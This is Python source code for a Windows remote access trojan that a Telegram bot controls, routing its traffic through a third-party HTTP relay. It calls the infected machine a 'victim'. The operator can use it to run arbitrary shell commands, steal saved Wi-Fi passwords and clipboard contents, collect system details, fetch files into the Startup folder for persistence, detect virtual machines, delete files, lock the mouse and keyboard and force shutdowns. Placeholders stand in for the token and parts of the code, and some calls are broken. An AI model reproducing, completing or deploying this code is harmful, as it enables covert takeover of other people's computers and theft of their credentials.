# import libraries
from os import chdir, getcwd, remove, startfile
from time import tzname, sleep, strftime
from subprocess import getoutput, Popen
from pyautogui import write, hotkey
from pynput import mouse, keyboard
from tkinter import messagebox
import json, wget, webbrowser
from bs4 import BeautifulSoup
from getpass import getuser
from platform import uname
from tkinter import *
import requests
import os
# get file location
cwd = getcwd()
# create functions
def check_internret(): # send a request to google.com to check internet connection
    try:
        requests.get("https://www.google.com/")
        return True
    except: 
        return False
if check_internret(): # if internet connection was success run main program
    from time import tzname, sleep, strftime
    from subprocess import getoutput, Popen
    from pyautogui import write, hotkey
    from pynput import mouse, keyboard
    import json, wget, webbrowser
    from bs4 import BeautifulSoup
    from getpass import getuser
    from platform import uname
    import threading
    import socket
    # create first values
    mouse_listener = mouse.Listener(suppress=True)
    keyboard_listener = keyboard.Listener(suppress=True)
    web_ip = requests.get("https://api.ipify.org/").text
    local_ip = socket.gethostbyname(socket.gethostname())
    token = BOT_TOKEN 
    id = TELEGRAM_ID
    keep_disable = True
    commands = ["/check", 
                "/sysinfo", 
                "/get_clipboard", 
                "/set_clipboard", 
                "/kill_process", 
                "/open_site", 
                "/stop_bot",
                "/pass", 
                "/shutdown", 
                "/command_line", 
                "/download",
                "/connected_wifi",
                "/wifi_password",
                "/con_wifi_names",
                "/check_exist",
                "/whereami",
                "/startup",
                "/check_vm",
                "/mkdir",
                "/rm",
                "/create_file",
                "/show_error",
                "/show_info",
                "/show_warning",
                "/voice",
                "/disable_mouse_keyboard",
                "/enable_mouse_keyboard",
                "/chdir",
                "/process",
                "/chruns",
                "/drivers",
                "/localhost", 
                "/open_app", 
                "/write_word", 
                "/hotkey",
                "/press_enter",
                "/alt_f4",
                "/find_all"]
    # commands functions
    def send_msg(message, token=token, id=id):
        try:
            url = f"https://api.telegram.org/bot{token}/sendmessage?chat_id={id}&text={message}"
            data = {"UrlBox":url,
                    "AgentList":"Internet Explorer",
                    "VersionsList":"HTTP/1.1",
                    "MethodList":"GET"}
            RATg = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", data=data)
            if RATg.status_code == 200: return True
            else: return False
        except: return False
    def read_msg(token=token):
        try:
            url = f"https://api.telegram.org/bot{token}/GetUpdates"
            data = {"UrlBox" : url,
                    "AgentList" : "Internet Explorer",
                    "VersionsList" : "HTTP/1.1",
                    "MethodList" : "GET"}
            source = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx", data=data).content.decode()
            soup = BeautifulSoup(source, "html.parser")
            find_tag = json.loads(str(soup.findAll("pre"))[61:-7])
            return find_tag["result"][-1]["message"]["text"]
        except: return False
    # request handling functions
    def sysinfo():
        try:
            u = uname()
            info = f"""    IP: {ip}
    Local IP: {local_ip}
    System: {u[0]}
    System Version: {u[2]}
    OS Caption: {getoutput("wmic os get caption").replace(" ", "").replace("\n", "").replace("Caption", "")}
    OS Architecture: {getoutput("wmic os get OSArchitecture").replace(" ", "").replace("\n", "").replace("OSArchitecture", "")}
    Node: {u[1]}
    Machine: {u[4]}
    Time Zone: {tzname[0]}
    User: {getuser()}
    OS CPU: {getoutput("wmic cpu get name").replace("Name", "").replace(" ", "").replace("\n", "")}
    CPU Cores: {getoutput("wmic cpu get numberofcores").replace("\n", "").replace("NumberOfCores", "").replace(" ", "")}
    Firewall state: {getoutput("netsh advfirewall show publicprofile").replace("----------------------------------------------------------------------", "").replace("\n\n", "").replace(" ", "").split("\n")[1][-2:].lower()}"""
            state = send_msg(info)
        except: send_msg("Error;")
    def get_clipboard():
        try: send_msg(getoutput("powershell get-clipboard"))
        except: send_msg("Error;")
    def set_clipboard():
        try:
            data = read_msg().replace("/set_clipboard ", "")
            getoutput(f"powershell set-clipboard '{data}'")
            send_msg(f"Copied as {data}")
        except: send_msg("Error;")
    def kill_process():
        try:
            data = read_msg().replace("/kill_process ", "")
            state = getoutput(f"taskkill /f /im {data}*")
            if "SUCCESS" in state: send_msg(f"Process {data}... is complete closed.")
            else: send_msg("Could not find the process.")
        except: send_msg("Error;")
    def open_site():
        try:
            data = read_msg().replace("/open_site ", "")
            webbrowser.open_new_tab(data)
            send_msg(f"{data} is completely opened.")
        except: send_msg("Error;")
    def stop_bot():
        try:
            send_msg("When you stop this. you cant connect again till app open again. if you are sure send Y if not send N(in 10 seconds): ")
            sleep(10)
            text = read_msg().lower()
            if text == "y": 
                send_msg(f"Bot is going to stop at {strftime("%H : %M : %S")}.")
                exit()
            else: 
                send_msg("Bot dose not closed.")
        except: send_msg("Error;")
    def shutdown():
        try:
            send_msg("System is going to turn off after this message.")
            getoutput("shutdown /s /f /t 0")
            sleep(5)
            send_msg("If you see this message it means PC did not shutdown")
        except: send_msg("Error;")
    def command_line():
        try:
            data = read_msg().replace("/open_site ", "")
            out = getoutput(data)
            send_msg("This is the response:\n" + out)
        except: send_msg("Error;")
    def download():
        try:
            send_msg("write file url(in 10 seconds):")
            sleep(10)
            url = read_msg()
            send_msg("write path to install(in 10 seconds):")
            sleep(10)
            path = read_msg()
            if path != url: wget.download(url, out=path)
            else: wget.download(url)
            send_msg("File is downloaded.")
        except: send_msg("Error;")
    def connected_wifi():
        try:
            ssid = getoutput('netsh wlan show interfaces').replace("", "").replace("Thereis1interfaceonthesystem:", "").replace("Hostednetworkstatus:Notavailable", "").replace("\n\n\n", "").split("\n")[6].replace("SSID:", "")
            send_msg(ssid)
        except: send_msg("Error;")
    def wifi_password():
        try:
            send_msg("write SSID(in 10 seconds):")
            sleep(10)
            ssid = read_msg()
            passw = getoutput(f"netsh wlan show profiles {ssid} key=clear").replace(" ", "").replace("ProfileoninterfaceWi-Fi:", "").replace("=======================================================================", "").replace("Applied:AllUserProfile", "").replace("Profileinformation", "").replace("-------------------", "").replace("\n\n\n\n\n\n\n\n", "").replace("-----------------", "").replace("-------------", "").replace("--", "").split("\n")
            def find_password():
                for i in range(len(passw)):
                    if "KeyContent" in passw[i]:
                        return passw[i].replace("KeyContent:", "")
            send_msg(find_password())
        except: send_msg("Error;")
    def check_exist():
        try:
            send_msg("write your file address(in 8 seconds):")
            sleep(8)
            addr = read_msg()
            send_msg("write your file name(in 8 seconds): ")
            sleep(8)
            file = read_msg()
            if file != addr: state = os.Check_exist(addr, file)
            else: os.Check_exist(File_name=file)
            send_msg(f"This is the response:\n{state}")
        except: send_msg("Error;")
    def all_commands():
        commands_txt = """"""
        for i in range(len(commands)):
            commands_txt += f"{i+1}. {commands[i]}\n"
        send_msg(commands_txt)
    def connected_wifi_names():
        try:
            names = getoutput("netsh wlan show profiles").replace("Profiles on interface Wi-Fi:", "").replace("Group policy profiles (read only)", "").replace("---------------------------------", "").replace("    <None>", "").replace("\n\n\n\n\n\n\n", "").replace("User profiles", "").replace("-------------", "").replace("    ", "").replace("\n\n", "").replace("All User Profile : ", "").split("\n")
            names.remove("")
            for i in range(len(names)): 
                send_msg(f"Number {i + 1}: {names[i]}")
        except: send_msg("Error;")
    def whereami():
        try: send_msg(os.Get_code_address())
        except: send_msg("Error;")
    def startup():
        try:
            send_msg("Write your download link(in 10 seconds):")
            sleep(10)
            url = read_msg()
            path = fr"C:\Users\{getuser()}\AppData\Roaming\Microsoft\Windows\Start Menu\PrograRAT\Startup"
            wget.download(url, out=path)
            send_msg("File is added to startup.")
        except: send_msg("Error;")
    def check_vm():
        try:
            vm = getoutput("powershell wmic computersystem get model").replace("\n", "").replace("Model", "").replace(" ", "")
            send_msg(vm)
        except: send_msg("Error;")
    def mkdir():
        try:
            send_msg("write directory name(in 10 seconds):")
            sleep(10)
            name = read_msg()
            os.Create_directory(name)
            send_msg(f"{name} Directory is created.")
        except: send_msg("Error;")
    def rm():
        try:
            send_msg("write file name(in 10 seconds):")
            sleep(10)
            file = read_msg()
            send_msg("write file address(in 10 seconds):")
            sleep(10)
            addr = read_msg()
            if file != addr: 
                remove(addr+file)
                send_msg(f"{addr+file} is removed.")
            else: 
                remove(file)
                send_msg(f"{file} is removed.")
        except: send_msg("Error;")
    def create_file():
        try:
            send_msg("write your file name(in 10 seconds):")
            sleep(10)
            name = read_msg()
            send_msg("write your file text(in 10 seconds):")
            sleep(10)
            text = read_msg()
            with open(name, "w") as writer: writer.write(text)
            send_msg(f"{name} is created.")
        except: send_msg("Error;")
    def show_error():
        try:
            send_msg("write the title of error message(in 10 seconds):")
            sleep(10)
            title = read_msg()
            send_msg("write the text of error message(in 10 seconds):")
            sleep(10)
            text = read_msg()
            messagebox.showerror(title, text)
        except: send_msg("Error;")
    def show_info():
        try:
            send_msg("write the title of info message(in 10 seconds):")
            sleep(10)
            title = read_msg()
            send_msg("write the text of info message(in 10 seconds):")
            sleep(10)
            text = read_msg()
            messagebox.showinfo(title, text)
        except: send_msg("Error;")
    def show_warning():
        try:
            send_msg("write the title of warning message(in 10 seconds):")
            sleep(10)
            title = read_msg()
            send_msg("write the text of warning message(in 10 seconds):")
            sleep(10)
            text = read_msg()
            messagebox.showwarning(title, text)
        except: send_msg("Error;")
    def voice():
        try:
            send_msg("write your text(in 10 seconds):")
            sleep(10)
            text = read_msg()
            voice = Hub.Voice(text)
            voice.Say()
        except: send_msg("Error;")
    def disable_mouse_keyboard():
        try:
            send_msg("Mouse and Keyboard is getting disable.")
            mouse_listener.start()
            keyboard_listener.start()
        except: send_msg("Error;")
    def enable_mouse_keyboard():
        try:
            send_msg("Mouse and Keyboard is getting enable.")    
            mouse_listener.stop()
            keyboard_listener.stop()
        except: send_msg("Error;")
    def change_dir():
        try:
            send_msg("write the address you want to go(in 10 seconds):")
            sleep(10)
            addr = read_msg()
            chdir(addr)
            send_msg(f"address changed to {addr}")
        except: send_msg("Error;")
    def process():
        try:
            process = getoutput("wmic process get name").replace("Name", "").replace("\n\n", "").replace("System", "").replace("Secure", "").replace("Registry", "").split()
            for i in process:
                if i[-4:] == ".exe": send_msg(i)
                else: pass
                pass_state = read_msg()
                if pass_state == "/pass": break
        except: send_msg("Error;")
    def chruns():
        try:
            send_msg("write your app name(in 10 seconds): ")
            sleep(10)
            app = read_msg()
            location = getoutput(f"wmic process where name=\"{app}\" get ExecutablePath")
            send_msg(f"This is the response:\n{location}")
        except: send_msg("Error;")
    def drivers():
        try:
            data = getoutput("net share").replace("Share name", "").replace("Resource", "").replace("Remark", "").replace("-------------------------------------------------------------------------------", "").replace("The command completed successfully.", "").replace("\n\n", "").replace("Default share","").replace("Remote IPC", "").replace("Remote Admin", "").replace(r"C:\windows", "").replace("IPC$", "").replace("ADMIN$", "").replace(" ", "").split()
            send_msg(f"This is the response:\n{data}")
        except: send_msg("Error;")
    def localhost():
        try:
            send_msg("write your port(in 8 seconds):")
            sleep(8)
            port = read_msg()
            Popen(f"python -m http.server {port} -b {local_ip}", shell=True)
            send_msg(f"Localhost is started at: http://{local_ip}:{port}")
        except: send_msg("Error;")
    def open_app():
        try:
            send_msg("write complete name of application(in 10 seconds || example: cmd.exe):")
            sleep(10)
            name = read_msg()
            try:
                startfile(name)
                send_msg(f"{name} application is opened.")
            except FileNotFoundError:
                send_msg("File not found.")
        except: send_msg("Error;")
    def write_word():
        try:
            send_msg("write your text(in 5 seconds):")
            sleep(5)
            text = read_msg()
            write(text)
            send_msg(f"{text} is writed")
        except: send_msg("Error;")
    def _hotkey():
        try:
            send_msg("write your hotkeys(in 10 seconds || split with space):")
            sleep(10)
            all_key = str(read_msg()).split(" ")
            len_key = len(all_key)
            if len_key == 1 and len_key != 0: hotkey(all_key[0])
            else: hotkey(all_key[0], all_key[1])
        except: send_msg("Error;")
    def press_enter():
        try: hotkey("enter")
        except: send_msg("Error;")
    def alt_f4():
        try: hotkey("alt", "f4")
        except: send_msg("Error;")
    def find_all():
        try:
            send_msg("write limit of find(in 5 seconds):")
            sleep(5)
            limit = int(read_msg())
            send_msg("write file format(in 5 seconds): ")
            sleep(5)
            form = read_msg()
            all_files = getoutput(f"dir /s /b *.{form}")
            all_files = all_files.split("\n")
            out = """"""
            for i in range(len(all_files)):
                if i + 1 == limit: break
                else:
                    out += f"{i+1}. {all_files[i]}\n"
            send_msg(out)
        except: send_msg("Error;")
    def listener():
        global cwd
        while True:
            try:
                command = read_msg()
                if command.startswith("/pass"):  pass #TODO: convert pass -> continue
                else:
                    if command.startswith("/check"): send_msg("This is check message")
                    if command.startswith("/sysinfo"): sysinfo()
                    if command.startswith("/get_clipboard"): get_clipboard()
                    if command.startswith("/set_clipboard"): set_clipboard()
                    if command.startswith("/kill_process"): kill_process()
                    if command.startswith("/open_site"): open_site()
                    if command.startswith("/stop_bot"): stop_bot()
                    if command.startswith("/shutdown"): shutdown()
                    if command.startswith("/command_line"): command_line()
                    if command.startswith("/download"): download()
                    if command.startswith("/connected_wifi"): connected_wifi()
                    if command.startswith("/wifi_password"): wifi_password()
                    if command.startswith("/check_exist"): check_exist()
                    if command.startswith("/all_commands"): all_commands()
                    if command.startswith("/connected_wifi_names"): connected_wifi_names()
                    if command.startswith("/whereami"): whereami()
                    if command.startswith("/startup"): startfile()
                    if command.startswith("/check_vm"): check_vm()
                    if command.startswith("/mkdir"): mkdir()
                    if command.startswith("/rm"):  rm()
                    if command.startswith("/create_file"): create_file()
                    if command.startswith("/show_error"): show_error()
                    if command.startswith("/show_info"): show_info()
                    if command.startswith("/show_warning"): show_warning()
                    if command.startswith("/voice"): voice()
                    if command.startswith("/disable_mouse_keyboard"): threading.Thread(target=disable_mouse_keyboard).start()
                    if command.startswith("/enable_mouse_keyboard"): threading.Thread(target=enable_mouse_keyboard).start()
                    if command.startswith("/chdir"): change_dir()
                    if command.startswith("/process"): process()
                    if command.startswith("/chruns"):  chruns()# Check run locations
                    if command.startswith("/drivers"): drivers()
                    if command.startswith("/localhost"): localhost()
                    if command.startswith("/open_app"): open_app()
                    if command.startswith("/write_word"): write_word()
                    if command.startswith("/hotkey"): _hotkey()
                    if command.startswith("/press_enter"): press_enter()
                    if command.startswith("/alt_f4"): alt_f4()
                    if command.startswith("/find_all"): find_all()
                    send_msg("click /pass")
                    sleep(5)
            except: 
                send_msg("start() function error. try again...")
                continue
    send_msg(f"Connected to victim with {web_ip}(local: {local_ip}) at {strftime("%H:%M:%S")}. When trap close I will notic you.")
ONLINE_CODE
    send_msg(f"Victim is closed trap at {strftime("%H:%M:%S")}(write /commands for help).")
    listener()
else: # if network has broken run offline code
OFFLINE_CODE